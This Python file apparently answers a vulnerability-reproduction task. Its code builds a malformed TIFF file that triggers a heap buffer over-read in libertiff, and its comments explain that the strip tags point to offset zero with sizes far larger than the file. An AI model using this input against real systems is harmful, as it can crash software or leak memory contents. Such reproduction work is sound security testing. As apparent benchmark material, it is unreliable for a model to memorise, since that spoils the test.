import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a PoC for Heap Buffer Overflow in libertiff
        # The vulnerability is triggered by an offline tag (size > 4 bytes) having a value offset of 0.
        # This causes the parser to read data from the beginning of the file (offset 0).
        # If the tag count implies a size larger than the file size, a heap buffer overflow (read) occurs.

        # TIFF Header (Little Endian)
        # 'II' (0x4949), Version 42 (0x002A), Offset to IFD 8
        poc = bytearray(b'II\x2a\x00\x08\x00\x00\x00')

        entries = []

        def add_entry(tag, type_, count, val):
            # Tag (2), Type (2), Count (4), Value/Offset (4)
            entries.append(struct.pack('<HHII', tag, type_, count, val))

        # Construct a minimal valid IFD with standard tags to reach deep parsing
        
        # 256 ImageWidth: 100
        add_entry(256, 4, 1, 100)
        
        # 257 ImageLength: 1000
        # High length implies many strips if RowsPerStrip is 1
        add_entry(257, 4, 1, 1000)
        
        # 258 BitsPerSample: 8
        add_entry(258, 3, 1, 8)
        
        # 259 Compression: 1 (None)
        add_entry(259, 3, 1, 1)
        
        # 262 PhotometricInterpretation: 1 (BlackIsZero)
        add_entry(262, 3, 1, 1)
        
        # 273 StripOffsets: 1000 entries
        # Count = 1000, Type = LONG (4 bytes) -> Total Size = 4000 bytes
        # Offset = 0 -> Points to start of file (Header)
        # Vulnerability: Parser reads 4000 bytes from offset 0.
        # Since file is small (~120 bytes), this triggers a Heap Buffer Overflow (Read).
        add_entry(273, 4, 1000, 0)
        
        # 277 SamplesPerPixel: 1
        add_entry(277, 3, 1, 1)
        
        # 278 RowsPerStrip: 1
        add_entry(278, 4, 1, 1)
        
        # 279 StripByteCounts: 1000 entries
        # Also set to offset 0 to ensure trigger if this is read first
        add_entry(279, 4, 1000, 0)

        # TIFF requires tags to be sorted by ID
        entries.sort(key=lambda e: struct.unpack('<H', e[:2])[0])

        # Construct IFD: NumEntries (2 bytes) + Entries + NextIFD (4 bytes)
        num_entries = len(entries)
        ifd = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)

        poc.extend(ifd)

        return bytes(poc)
